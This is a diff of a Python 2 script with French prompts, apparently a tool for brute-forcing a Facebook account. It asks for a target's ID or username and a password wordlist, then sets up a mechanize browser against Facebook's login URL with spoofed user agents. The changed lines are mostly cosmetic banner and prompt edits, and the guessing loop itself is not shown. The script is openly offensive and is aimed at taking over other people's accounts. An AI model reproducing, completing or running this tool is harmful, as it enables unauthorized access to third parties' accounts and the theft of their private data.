@@ -1,10 +1,9 @@
 #!/usr/bin/python2
-# -*- coding: utf-8 -*-
+#coding=utf-8
 
-import time,sys,random,cookielib,mechanize,os
+import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,requests,mechanize,fileinput
 reload(sys)
 sys.setdefaultencoding('utf8')
-
 
 def Street(z):
 	for e in z + '\n':
@@ -18,12 +17,12 @@ def auto(a):
 		sys.stdout.flush()
 		time.sleep(0.009)
     
-logo = """[38;5;214m●▬▬▬▬▬▬▬▬๑\033[1;97m●▬▬▬▬▬▬▬▬๑۩۩๑▬▬▬▬▬▬▬●\033[1;32m●▬▬▬▬▬▬▬▬๑۩۩๑▬▬▬▬▬▬●
-[38;5;214m●____ _  _ ____ __\033[1;97m__ ____ ____    _  _ \033[1;32m___ _ _    ____● 
-[38;5;214m●|    |__| |__| |_\033[1;97m_/ | __ |___    |  | \033[1;32m |  | |    |___● 
-[38;5;214m●|___ |  | |  | | \033[1;97m \ |__] |___    |__| \033[1;32m |  | |___ |___● 
-[38;5;214m●▬▬▬▬▬▬▬▬๑\033[1;97m●▬▬▬▬▬▬▬▬๑۩۩๑▬▬▬▬▬▬▬●\033[1;32m●▬▬▬▬▬▬▬▬๑۩۩๑▬▬▬▬▬▬●          
-"""
+#logo = """
+#\033[38;5;214m●▬▬▬▬▬▬▬▬๑\033[1;97m●▬▬▬▬▬▬▬▬๑۩۩๑▬▬▬▬▬▬▬●\033[1;32m●▬▬▬▬▬▬▬▬▬▬▬▬▬๑۩۩๑▬▬▬▬▬▬●
+#\033[38;5;214m● ____ _  _ ____ __\033[1;97m__ ____ ____    _  _ \033[1;32m___ _ _    ____  ● 
+#\033[38;5;214m● |    |__| |__| |_\033[1;97m_/ | __ |___    |  | \033[1;32m |  | |    |___  ● 
+#\033[38;5;214m● |___ |  | |  | | \033[1;97m \ |__] |___    |__| \033[1;32m |  | |___ |___  ● 
+#\033[38;5;214m●▬▬▬▬▬▬▬▬๑\033[1;97m●▬▬▬▬▬▬▬▬๑۩۩๑▬▬▬▬▬▬▬●\033[1;32m●▬▬▬▬▬▬▬▬▬▬▬▬▬๑۩۩๑▬▬▬▬▬▬● """
 os.system('clear')
 time.sleep(0.5)
 try:
@@ -32,15 +31,16 @@ except ModuleNotFoundError:
     print '\033[1;91m[!]\033[1;97mLe Module \033[1;91m>\033[1;93mMechanize\033[1;91m<\033[1;97m introuvable!\n\033[1;97mCe module n\'est disponible qu\'en python 2.x\033[1;91m :/\n\033[1;97mVeuillez l\'installer en exexcutant cette commande \033[1;91m(\033[1;92mpip install mechanize\033[1;91m)\033[1;97m et\nexecutez le programme avec a nouveau en tapant\033[1;92m python\033[1;91m2\033[1;91m pirate'
     exit()
 	
+#os.system("clear")
+#auto(logo)
+#raw_input("\n\033[1;91m[\033[1;97mTaper entrer\033[1;91m]")
+#time.sleep(3)
 os.system("clear")
-auto(logo)
-time.sleep(3)
-os.system("clear")
-print """[38;5;214m●▬▬▬▬▬▬▬▬๑\033[1;97m●▬▬▬▬▬▬๑۩۩๑▬▬▬▬▬▬●●▬▬▬▬▬\033[1;32m▬▬▬▬๑۩۩๑▬▬▬▬▬▬●             
-[38;5;214m•_  _ ____ \033[1;97m _  _ ____ ____ _  _\033[1;32m ____ ____   _  _• 
-[38;5;214m•|\/| |__/ \033[1;97m |__| |__| |    |_/ \033[1;32m |___ |__/   |_/ • 
-[38;5;214m•|  | |  \ \033[1;97m |  | |  | |___ | \_\033[1;32m |___ |  \ __| \_•    
-[38;5;214m●▬▬▬▬▬▬▬▬๑\033[1;97m●▬▬▬▬▬▬๑۩۩๑▬▬▬▬▬▬●●▬▬▬▬▬\033[1;32m▬▬▬▬๑۩۩๑▬▬▬▬▬▬●"""                                                                                                                   
+print ("""\033[38;5;214m●▬▬▬▬▬▬▬▬๑\033[1;97m●▬▬▬▬▬▬๑۩۩๑▬▬▬▬▬▬●●▬▬▬▬▬\033[1;32m▬▬▬▬๑۩۩๑▬▬▬▬▬▬●             
+\033[38;5;214m•_  _ ____ \033[1;97m _  _ ____ ____ _  _\033[1;32m ____ ____   _  _• 
+\033[38;5;214m•|\/| |__/ \033[1;97m |__| |__| |    |_/ \033[1;32m |___ |__/   |_/ • 
+\033[38;5;214m•|  | |  \ \033[1;97m |  | |  | |___ | \_\033[1;32m |___ |  \ __| \_•    
+\033[38;5;214m●▬▬▬▬▬▬▬▬๑\033[1;97m●▬▬▬▬▬▬๑۩۩๑▬▬▬▬▬▬●●▬▬▬▬▬\033[1;32m▬▬▬▬๑۩۩๑▬▬▬▬▬▬●""" )                                                                                                                  
 print("\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈• \033[1;91mMr\033[1;96m Faxel\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•")
 print("")
 Nu  = "Faxel"
@@ -80,7 +80,7 @@ print("""
 print("")
 mael = str(raw_input("\033[1;91m[\033[1;97m*\033[1;91m]\x1b[32m ID\x1b[31m/\033[32;1mNom d\'utilisateur\x1b[37m de votre cible\033[91m : \x1b[36m  "))
 print("")
-motdepasse = str(raw_input("\033[1;91m[\033[1;97m+\033[1;91m]\033[0;1m Entrez le fichier de liste de mots \033[31m(\x1b[32mfaxel.txt\x1b[31m) : \033[37m"))
+motdepasse = str(raw_input("\033[1;91m[\033[1;97m+\033[1;91m]\033[0;1m Entrez le nom de votre wordliste \033[31m(\x1b[32mFaxel.txt\x1b[31m) : \033[37m"))
 connexion = 'https://www.facebook.com/login.php?login_attempt=1'
 agentutilisateur = [('Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0','Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Geck')]
 # agentutilisateur = [('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36','Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36','Mozilla/5.0 (Windows NT 5.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36','Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36','Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36','Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36','Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36','Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36',)]
@@ -113,6 +113,7 @@ def liste_de_mot():
                 liste_de_mot()
 
 def menu():
+	
         global antoine
         antoine = mechanize.Browser()
         cho = cookielib.LWPCookieJar()
@@ -190,5 +191,3 @@ def Kouadio():
 		
 if __name__=='__main__':
 	menu()
-
-
